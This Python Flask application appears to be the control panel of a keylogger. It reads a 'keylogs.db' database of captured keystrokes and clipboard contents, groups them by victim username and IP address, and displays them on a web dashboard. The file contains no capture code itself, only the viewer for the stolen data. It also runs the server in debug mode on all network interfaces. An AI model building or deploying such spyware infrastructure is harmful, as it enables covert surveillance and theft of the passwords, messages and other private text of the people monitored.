from flask import Flask, render_template, g
import sqlite3

app = Flask(__name__)
DB_FILE = "keylogs.db"


def get_db():
    db = getattr(g, "_database", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, "_database", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT DISTINCT username FROM logs")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT timestamp, username, ip, text FROM logs ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()

    user_logs = {}
    for row in rows:
        timestamp, username, ip, text = row
        user_key = (username, ip)
        if user_key not in user_logs:
            user_logs[user_key] = []
        user_logs[user_key].append({"timestamp": timestamp, "text": text})
    return user_logs


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "SELECT timestamp, username, ip, text FROM clipboard_logs ORDER BY timestamp DESC"
    )
    rows = c.fetchall()
    conn.close()

    clipboard_logs = {}
    for row in rows:
        timestamp, username, ip, text = row
        user_key = (username, ip)
        if user_key not in clipboard_logs:
            clipboard_logs[user_key] = []
        clipboard_logs[user_key].append({"timestamp": timestamp, "text": text})
    return clipboard_logs


@app.route("/")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    return render_template(
        "index.html",
        unique_users=unique_users,
        user_logs=user_logs,
        clipboard_logs=clipboard_logs,
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
